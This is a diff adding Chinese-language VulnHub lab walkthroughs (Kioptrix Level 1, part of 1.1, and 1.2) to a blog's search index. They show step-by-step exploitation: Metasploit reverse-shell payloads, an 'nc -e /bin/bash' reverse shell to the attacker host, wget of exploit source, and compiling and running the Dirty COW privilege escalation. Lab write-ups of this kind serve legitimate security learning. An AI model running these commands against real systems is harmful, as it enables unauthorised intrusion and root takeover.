+<p>searchsploit -m linux/local/9542.c 是一個使用 searchsploit 工具的命令。在這個命令中，-m 表示 “mirror”（鏡像），它的作用是將 Exploit Database 中路徑為 linux/local/9542.c 的漏洞利用程式文件複製到當前工作目錄。-m 選項使您能夠在不離開命令行的情況下複製漏洞利用程式文件。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1uqIpoYa.png" alt="image"></p>
+<br>
+<br>
+
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.0.8/9542.c</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJbFVToFp.png" alt="image"></p>
+<p>因為沒有起相關http服務被拒絕，因此<code>pytho3 -m http.server 80</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJmbp2itT.png" alt="image"></p>
+<p>再一次<code>wget http://192.168.0.8/9542.c</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJA3Vaitp.png" alt="image"></p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line">gcc -o exploit 9542.c</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BkcfUpsFT.png" alt="image"></p>
+<p>如果想解warning，<code>echo &gt;&gt; 9542.c</code>這個命令利用了 echo 命令用於輸出文本，以及 &gt;&gt; 重定向操作符用於將輸出附加到文件末尾。當這個命令運行時，它將一個空字符串（即一個換行符號）添加到指定文件的末尾。這是一種快速且常見的方式，特別是當需要手動在文件末尾插入換行符號時。然而，這種方法僅限於向文件末尾添加換行符號，並假設文件 9542.c 已經存在。如果文件不存在，則這個命令將創建一個新文件。<br><br><br><br></p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./exploit</span><br><span class="line">whoami</span><br><span class="line">id</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ryekITjKT.png" alt="image"></p>
+]]></content>
+      <tags>
+        <tag>VulnHub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>KIOPTRIX: LEVEL 1.2</title>
+    <url>/2024/11/30/KIOPTRIX-LEVEL-1-2/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link" href="https://www.vulnhub.com/entry/kioptrix-level-12-3,24/">靶機簡介<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><strong>Description</strong><br>It’s been a while since the last Kioptrix VM challenge. Life keeps getting the way of these things you know.</p>
+<p>After the seeing the number of downloads for the last two, and the numerous videos showing ways to beat these challenges. I felt that 1.2 (or just level 3) needed to come out. Thank you to all that downloaded and played the first two. And thank you to the ones that took the time to produce video solutions of them. Greatly appreciated.</p>
+<p>As with the other two, this challenge is geared towards the beginner. It is however different. Added a few more steps and a new skill set is required. Still being the realm of the beginner I must add. The same as the others, there’s more then one way to “pwn” this one. There’s easy and not so easy. Remember… the sense of “easy” or “difficult” is always relative to ones own skill level. I never said these things were exceptionally hard or difficult, but we all need to start somewhere. And let me tell you, making these vulnerable VMs is not as easy as it looks…</p>
+<p>Important thing with this challenge. Once you find the IP (DHCP Client) edit your hosts file and point it to kioptrix3.com</p>
+<p>Under Windows, you would edit C:\Windows\System32\drivers\etc\hosts to look something like this:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># localhost name resolution is handled within DNS itself.</span><br><span class="line">#   127.0.0.1 localhost</span><br><span class="line">#   ::1 localhost127.0.0.1 static3.cdn.ubi.com</span><br></pre></td></tr></table></figure></div>
+<p>192.168.1.102 kioptrix3.com</p>
+<p>Under Linux that would be /etc/hosts</p>
+<p>There’s a web application involved, so to have everything nice and properly displayed you really need to this.</p>
+<p>Hope you enjoy Kioptrix VM Level 1.2 challenge.</p>
+<p><strong>Virtual Machine</strong><br>Format: Virtual Machine (VMware)<br>Operating System: Linux</p>
+<p><strong>Networking</strong><br>DHCP service: Enabled<br>IP address: Automatically assign</p>
+<br>
+<br>
+
+<p><strong>前置工作</strong></p>
+<ul>
+<li>匯入 VMware</li>
+<li>虛擬機配置不同網路-Bridged(<a class="link" href="https://blog.csdn.net/Attsky/article/details/109320325">網路<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>、<a class="link" href="https://blog.csdn.net/qq1069380146/article/details/111995334">IP<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BkJ6mp_tp.png" alt="image"><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJOQumtKT.png" alt="image"></li>
+<li><a class="link" href="https://youtu.be/KgG-r32jvDc?si=M1Ho6yPDYaliLqOU">教學影片<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/B1pNd8z5p.png" alt="image"></li>
+</ul>
+<br>
+<br>
+
+<h2 id="步驟一、搜索目標"><a href="#步驟一、搜索目標" class="headerlink" title="步驟一、搜索目標"></a>步驟一、搜索目標</h2><p>查找自己IP。<code>ifconfig</code>。自己IP為<code>192.168.0.8</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Bkq9uUz9a.png" alt="image"></p>
+<p>搜索靶機IP。<code>sudo netdiscover -r 192.168.0.0/24</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Hk2qt8fca.png" alt="image"></p>
+<p>目標為<code>192.168.0.10</code>。<br>nmap掃其服務<code>sudo nmap -A -T4 192.168.0.10</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/By6Vq8M5T.png" alt="image"><br>其http有網頁服務。<code>http://192.168.0.10/</code>。</p>
+<p><code>whatweb 192.168.0.10</code>。觀察其中含有<code>HTTPServer</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyswZvG96.png" alt="image"></p>
+<p>在Blog中觀察到有<code>http://kioptrix3.com/gallery</code>。<br>在Login中使用普通 SQL Injection 手法進不去。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SJzk4PM5a.png" alt="image"><br>觀察登入處最下方有<code>Proudly Powered by: LotusCMS</code>。<br><br><br><br></p>
+<h2 id="步驟二、針對其服務探索"><a href="#步驟二、針對其服務探索" class="headerlink" title="步驟二、針對其服務探索"></a>步驟二、針對其服務探索</h2><p><code>searchsploit LotusCMS</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJZuSvMcp.png" alt="image"></p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole -q</span><br><span class="line">search Lotus</span><br><span class="line">search LotusCMS</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/r1HUIvz9p.png" alt="image"><br><br></p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">use 0</span><br><span class="line">set payload generic/shell_reverse_tcp</span><br><span class="line">show options</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/B1ZxTPzqp.png" alt="image"><br><br></p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">set RHOSTS 192.168.0.10</span><br><span class="line">set URI /</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></div>
+<p>set URI / 的含義是將模塊的 URI 選項設置為 /。具體而言，用於指定攻擊目標的URI（Uniform Resource Identifier），即指定攻擊目標的路徑或位置。這很重要。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/S1SLTDMq6.png" alt="image"><br><br></p>
+<p>使用<code>id</code>查看身分。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJl00wGca.png" alt="image"><br><br><br><br></p>
+<h2 id="步驟三、另闢蹊徑取得權限"><a href="#步驟三、另闢蹊徑取得權限" class="headerlink" title="步驟三、另闢蹊徑取得權限"></a>步驟三、另闢蹊徑取得權限</h2><p><code>uname -a</code>得到系統 Linux Kernel 版本<code>2.6.24</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJqQZOG5T.png" alt="image"></p>
+<p><code>searchsploit Kernel 2.6.24</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ry-yQ_zca.png" alt="image"></p>
+<p>其中有一段：<br><code>Linux Kernel 2.6.22 &lt; 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)                       | linux/local/40839.c</code></p>
+<p>“Dirty COW” 是一個影響 Linux Kernel 的特權升級漏洞，受影響版本為 2.6.22 到 3.9。漏洞利用了 PTRACE_POKEDATA 的競爭條件，攻擊者可以通過修改內核內存，實現特權升級。攻擊可能利用 <code>/etc/passwd</code> 文件，向其中添加具有特權的新用戶。系統管理員應盡快更新 Kernel 以修補此漏洞。提供的 <code>40839.c</code> 文件可能是漏洞利用代碼的參考。</p>
+<p><code>searchsploit -m linux/local/40839.c</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rkjLXdfqp.png" alt="image"></p>
+<p><code>python3 -m http.server</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/B1EkSOf9T.png" alt="image"><br><br><br><br></p>
+<h2 id="步驟四、建立連線"><a href="#步驟四、建立連線" class="headerlink" title="步驟四、建立連線"></a>步驟四、建立連線</h2><p>發現其shell跳不到/tmp。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyowL_zqT.png" alt="image"></p>
+<p>開啟另一個shell。<code>sudo nc -nlvp 6666</code>。開啟監聽。<br>在原本Shell輸入<code>nc -e /bin/bash 192.168.0.8 6666</code>與另一個shell建立連線。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ryNQuOzcT.png" alt="image"><br><br></p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure></div>
+<p><code>python -c</code>：啟動 Python 解釋器並運行指定的 Python 代碼。<br><code>'import pty;pty.spawn("/bin/bash")'</code>：這是一個簡短的 Python 腳本，其中 import pty 導入 pty 模塊，而 pty.spawn(“/bin/bash”) 則啟動一個交互式的 Bash shell。這個 Python 命令使用 pty 模塊在 Linux 系統中生成一個交互式的 Bash shell。通過執行這條命令，你可以將一個非交互式的 shell 提升為交互式，方便進行進一步的操作。這樣的技巧通常在渗透測試和安全測試中使用，但應僅在合法且得到授權的環境中進行。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SyMTd_zc6.png" alt="image"></p>
+<p><code>wget http://192.168.0.8:8000/40839.c</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Sk14q_Gqa.png" alt="image"><br><br><br><br></p>
+<h2 id="步驟五、漏洞內容"><a href="#步驟五、漏洞內容" class="headerlink" title="步驟五、漏洞內容"></a>步驟五、漏洞內容</h2><p>裡面有使用教學。<code>cat 40839.c</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1M0qOf5p.png" alt="image"></p>
+<p>按照其敘述。</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -pthread 40839.c -o try -lcrypt</span><br><span class="line">ls -alh</span><br><span class="line">./try</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Bk6w6dG9p.png" alt="image"><br><br><br><br></p>
+<h2 id="步驟六、取得權限"><a href="#步驟六、取得權限" class="headerlink" title="步驟六、取得權限"></a>步驟六、取得權限</h2><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">su - firefart</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">輸入密碼</span></span><br><span class="line">id</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJyDAOM9a.png" alt="image"></p>
+]]></content>
+      <tags>
+        <tag>VulnHub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>picoCTF</title>
+    <url>/2024/11/30/picoCTF/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
+      <tags>
+        <tag>picoCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>KIOPTRIX: LEVEL 1</title>
+    <url>/2024/11/30/KIOPTRIX-LEVEL-1/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link" href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">靶機簡介<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><strong>Description</strong><br>KIOPTRIX VM IMAGE CHALLENGES:<br>This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.</p>
+<p><strong>Virtual Machine</strong><br>Format: Virtual Machine (VMware)<br>Operating System: Linux</p>
+<p><strong>Networking</strong><br>DHCP service: Enabled<br>IP address: Automatically assign</p>
+<br>
+<br>
+
+<h2 id="前置工作"><a href="#前置工作" class="headerlink" title="前置工作"></a><strong>前置工作</strong></h2><ul>
+<li>匯入 VMware<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1IEeaOKp.png" alt="image"></li>
+<li>虛擬機配置不同網路-Bridged(<a class="link" href="https://blog.csdn.net/Attsky/article/details/109320325">網路<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>、<a class="link" href="https://blog.csdn.net/qq1069380146/article/details/111995334">IP<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BkJ6mp_tp.png" alt="image"><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJOQumtKT.png" alt="image"></li>
+<li><a class="link" href="https://youtu.be/9cKhZaYecM4?si=v4t-Rware1D48a8Z">教學影片<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ByNlUGtFp.png" alt="image"></li>
+</ul>
+<br>
+<br>
+
+
+<h2 id="步驟一、找到其服務"><a href="#步驟一、找到其服務" class="headerlink" title="步驟一、找到其服務"></a>步驟一、找到其服務</h2><p>首先，先使用ifconfig查看自己的IP。<code>192.168.1.10</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SJshOmKYT.png" alt="image"></p>
+<p>使用netdiscover查看本地端的IP尋找靶機。<br><code>sudo netdiscover -r 192.168.1.0/24</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SJTDdXKFp.png" alt="image"></p>
+<p>使用nmap查看其服務。<br><code>sudo nmap -A -T4 192.168.1.104</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rkJSYmKKT.png" alt="image"></p>
+<br>
+    
+<h2 id="步驟二、尋找漏洞"><a href="#步驟二、尋找漏洞" class="headerlink" title="步驟二、尋找漏洞"></a>步驟二、尋找漏洞</h2><p>Metasploit 框架是一個功能豐富的開源渗透測試框架，其中的 msfconsole 是其<br>主要命令行界面，提供了一個互動式的控制台，用於進行漏洞測試和攻擊模擬。</p>
+<ol>
+<li>探索漏洞：<br>使用 <code>search</code> 指令來搜尋 Metasploit 框架中的漏洞模組。例如，你可以輸入以下指令搜尋特定漏洞： <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">search &lt;漏洞名稱&gt;</span><br></pre></td></tr></table></figure></div></li>
+<li>選擇攻擊模組：<br>使用 use 指令來選擇要使用的攻擊模組。一旦你找到了想要利用的漏洞模組，可以使用以下指令： <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">use &lt;模組名稱&gt;</span><br></pre></td></tr></table></figure></div></li>
+<li>設定攻擊模組參數：<br>使用 set 指令來設定攻擊模組的相關參數，以便定制攻擊的目標和方式。例如： <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">set &lt;參數名稱&gt; &lt;值&gt;</span><br></pre></td></tr></table></figure></div></li>
+<li>執行攻擊：<br>最後，使用 exploit 指令來執行選擇的攻擊模組，觸發相應的攻擊。這將開始模擬或實際執行渗透測試。 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure></div></li>
+</ol>
+<br>
+<br>
+
+<p><code>139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)</code> 很可疑。<br>smbd 是 Samba 軟體套件中的一個核心組件，是 Samba Daemon 的縮寫。Samba 是一個開源的軟體套件，提供了與 Microsoft Windows 互通的 SMB/CIFS 協定的實現。Samba 允許非 Windows 系統（例如 Linux、Unix）與 Windows 系統共享檔案、印表機和其他資源。smbd 是 Samba 中負責實現 SMB（Server Message Block）協定的守護進程，它允許其他機器通過 SMB/CIFS 協定訪問和共享資源。這使得 Linux/Unix 系統能夠擔任文件伺服器，與 Windows 系統協同工作，共享檔案和資源。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/r1ack4FY6.png" alt="image"><br><br><br>使用 msfconsole 查看。<code>sudo msfconsole</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ByKQyEKFp.png" alt="image"><br><br><br>查看<code>search smb_version</code>。使用<code>use 0</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJ7BgNYFT.png" alt="image"><br><br><br><code> options</code>。<br>在 Metasploit 框架中，options 是一個用於查看和配置模組（payload、exploit、auxiliary 等）參數的指令。這個指令允許你檢視目前模組的參數配置狀態，以及進行必要的修改。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJHFbEFta.png" alt="image"><br><br><br>設置<code>RHOSTS</code>參數為<code>192.169.1.104</code>。<br><code>set RHOSTS 192.168.1.104</code>。再<code>show options</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SkDkfVttT.png" alt="image"><br><br><br><code>exploit</code>。得到smba版本<code>Samba 2.2.1a</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ryKvG4KYp.png" alt="image"><br><br></p>
+<h2 id="步驟三、查找漏洞版本問題"><a href="#步驟三、查找漏洞版本問題" class="headerlink" title="步驟三、查找漏洞版本問題"></a>步驟三、查找漏洞版本問題</h2><p>Google <code>Samba 2.2.1a</code>在msfconsole上<a class="link" href="https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/linux/samba/trans2open">應用<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rySDQEYFp.png" alt="image"></p>
+<p>找到使用<code>trans2open</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ByXQSwtt6.png" alt="image"></p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">search trans2open</span><br><span class="line">use 1</span><br><span class="line">show options</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1k4IvKFa.png" alt="image"></p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">set RHOSTS 192.168.1.104</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/B1La8wKYT.png" alt="image"></p>
+<p><code>exploit</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BkgfwDtYa.png" alt="image"><br><br></p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">set payload generic/shell_reverse_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyThuwKFa.png" alt="image"><br>對於 generic/shell_reverse_tcp 這樣的 payload，它是一個反向 shell 載荷，通常設計成能夠與目標系統建立反向的 TCP 連接，以提供互動式的 shell 會話。generic 的使用表示這個 payload 將根據攻擊環境的具體情況進行一些通用的調整，以確保它在不同情境下的兼容性。<br><br></p>
+<h2 id="步驟四、驗證身分"><a href="#步驟四、驗證身分" class="headerlink" title="步驟四、驗證身分"></a>步驟四、驗證身分</h2><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line">id</span><br></pre></td></tr></table></figure></div>
+
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SyFKOPtKp.png" alt="image"></p>
+]]></content>
+      <tags>
+        <tag>VulnHub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>VulnHub</title>
+    <url>/2024/11/30/VulnHub/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link" href="https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview">EXERCISE.LIST<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h2 id="PWK-V1"><a href="#PWK-V1" class="headerlink" title="PWK V1"></a>PWK V1</h2><ul>
+<li><a href="../KIOPTRIX-LEVEL-1">KIOPTRIX: LEVEL 1</a></li>
+<li><a href="../KIOPTRIX-LEVEL-1-1">KIOPTRIX: LEVEL 1.1</a></li>
+<li><a href="../KIOPTRIX-LEVEL-1-2">KIOPTRIX: LEVEL 1.2</a></li>
+</ul>
+<p>.<br>.<br>.</p>
+<h2 id="PWK-V2"><a href="#PWK-V2" class="headerlink" title="PWK V2"></a>PWK V2</h2><ul>
+<li><a href="../HACK-ME-PLEASE-1">HACK ME PLEASE: 1</a></li>
+</ul>
+<p>.<br>.<br>.</p>
+]]></content>
+      <tags>
+        <tag>VulnHub</tag>
+      </tags>
   </entry>
 </search>
